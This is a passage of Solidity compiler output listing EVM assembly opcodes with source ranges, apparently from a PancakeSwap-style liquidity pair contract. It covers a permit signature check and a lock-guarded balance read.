											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP13"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP12"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP2"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP7"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP2"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP3"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "DUP1"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "MLOAD"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "SWAP1"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "DUP4"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "ADD"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "KECCAK256"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1901"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "F0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "102"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP6"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "122"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP6"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP6"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP7"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP7"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "142"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP5"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP3"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "DUP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "MLOAD"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "DUP4"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "KECCAK256"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP4"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "162"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP7"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP10"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "AND"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "182"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1A2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP9"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1C2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP8"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "SWAP2"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "SWAP4"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1E2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SUB"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "GAS"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "STATICCALL"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "271"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "271"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "DUP2"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "AND"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "ISZERO"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "DUP1"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "ISZERO"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "SWAP1"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "PUSH [tag]",
											"value": "272"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "JUMPI"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "POP"
										},
										{
											"begin": 4334,
											"end": 4339,
											"name": "DUP9"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "AND"
										},
										{
											"begin": 4314,
											"end": 4330,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "AND"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "EQ"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "tag",
											"value": "272"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "JUMPDEST"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH [tag]",
											"value": "273"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "JUMPI"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP2"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "1A"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "50616E63616B653A20494E56414C49445F5349474E4154555245000000000000"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MLOAD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP2"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SUB"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "REVERT"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "tag",
											"value": "273"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "JUMPDEST"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "PUSH [tag]",
											"value": "274"
										},
										{
											"begin": 4410,
											"end": 4415,
											"name": "DUP10"
										},
										{
											"begin": 4417,
											"end": 4424,
											"name": "DUP10"
										},
										{
											"begin": 4426,
											"end": 4431,
											"name": "DUP10"
										},
										{
											"begin": 4401,
											"end": 4409,
											"name": "PUSH [tag]",
											"value": "183"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "tag",
											"value": "274"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "JUMPDEST"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "tag",
											"value": "120"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "JUMPDEST"
										},
										{
											"begin": 6332,
											"end": 6346,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "SLOAD"
										},
										{
											"begin": 1191,
											"end": 1192,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1179,
											"end": 1192,
											"name": "EQ"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH [tag]",
											"value": "276"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPI"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SUB"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "REVERT"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "tag",
											"value": "276"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPDEST"
										},
										{
											"begin": 1233,
											"end": 1234,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1222,
											"end": 1230,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "DUP2"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "SWAP1"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "SSTORE"
										},
										{
											"begin": 1233,
											"end": 1234,
											"name": "DUP1"
										},
										{
											"begin": 6401,
											"end": 6414,
											"name": "PUSH [tag]",
											"value": "278"
										},
										{
											"begin": 6401,
											"end": 6412,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 6401,
											"end": 6414,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6401,
											"end": 6414,
											"name": "tag",
											"value": "278"
										},
										{
											"begin": 6401,
											"end": 6414,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6462,
											"end": 6468,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 6462,
											"end": 6468,
											"name": "SLOAD"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "DUP1"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "DUP2"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "MSTORE"
										},
										{
											"begin": 6488,
											"end": 6492,
											"name": "ADDRESS"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "DUP3"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "ADD"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "MSTORE"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "SWAP1"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "MLOAD"
										},
										{
											"begin": 6358,
											"end": 6414,
											"name": "SWAP4"
										},
										{
											"begin": 6358,
											"end": 6414,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6358,
											"end": 6414,
											"name": "SWAP2"
										},
										{
											"begin": 6358,
											"end": 6414,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6439,
											"end": 6452,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6439,
											"end": 6452,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6462,
											"end": 6468,
											"name": "SWAP1"
										},
										{
											"begin": 6462,
											"end": 6468,
											"name": "SWAP2"
										},
										{
											"begin": 6462,
											"end": 6468,
											"name": "AND"
										},
										{
											"begin": 6462,
											"end": 6468,
											"name": "SWAP2"
										},
										{
											"begin": 6455,
											"end": 6479,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 6455,
											"end": 6479,
											"name": "SWAP2"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "DUP1"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "DUP4"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "ADD"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "SWAP3"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "SWAP3"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "SWAP2"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "SWAP1"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "DUP3"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "SWAP1"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "SUB"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "ADD"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "DUP2"
										},
										{
											"begin": 6462,
											"end": 6468,
											"name": "DUP7"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "DUP1"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "279"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "279"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "POP"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "GAS"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "STATICCALL"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "280"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "280"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "POP"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "POP"
										},
										{
